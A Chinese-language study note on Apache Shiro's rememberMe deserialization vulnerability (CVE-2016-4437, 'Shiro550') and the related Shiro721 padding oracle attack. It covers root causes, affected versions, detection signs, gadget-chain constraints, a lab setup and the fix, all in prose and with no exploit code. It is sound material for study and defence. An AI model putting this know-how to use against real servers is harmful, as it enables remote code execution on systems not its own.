shiro550 rememberMe反序列化漏洞

Shiro rememberMe反序列化漏洞（CVE-2016-4437）

漏洞原理

Apache Shiro <= 1.2.4 版本中，加密的用户信息序列化后存储在Cookie的rememberMe字段中，攻击者可以使用Shiro的AES加密算法的默认密钥来构造恶意的Cookie rememberMe值，发送到Shiro服务端之后会先后进行Base64解码、AES解密、readObject()反序列化，从而触发Java原生反序列化漏洞，进而实现RCE。

该漏洞的根源在于硬编码Key。

漏洞版本

Apache Shiro <= 1.2.4

环境搭建

直接参考Vulhub：https://vulhub.org/#/environments/shiro/CVE-2016-4437/

特征

返回包中Set-Cookie头字段存在rememberMe=deleteMe字段

可以针对此类型接口进行PoC盲打

利用链

shiro写了一个ObjectInputStream的子类，org.apache.shiro.io.ClassResolvingObjectInputStream，其重写了resolveClass方法。

resolveClass是反序列化中用来查找类的方法，简单来说，读取序列化流的时候，读到一个字符串形

式的类名，需要通过这个方法来找到对应的java.lang.Class对象。

造成：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。

这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。

改造CommonsCollections6为CommonsCollectionsShiro

调试分析

处理rememberMe的值：

org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals

org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity

org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals

这里AES加密算法是对称加密算法，即加密和解密的Key是一样的，而该Key则是硬编码写死在其中。

修复

看到Apache Shiro 1.2.5版本的源码，修复方法就是将使用默认Key加密改为生成随机的Key加密：https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848

shiro721

在Shiro550中，我们可以直接通过硬编码密钥直接生成攻击密文。但是Shiro721使用了动态密钥，无法直接获取密钥。但是仍然可以通过Padding Oracle Attack绕过密钥，直接生成攻击密文。

影响版本

Apache Shiro <= 1.4.1

限制条件：

Apache Shiro Padding Oracle Attack的漏洞利用必须满足如下前提条件：

  • 开启rememberMe功能；
  • rememberMe值使用AES-CBC模式解密；
  • 能获取到正常Cookie，即用户正常登录的Cookie值；
  • 密文可控；
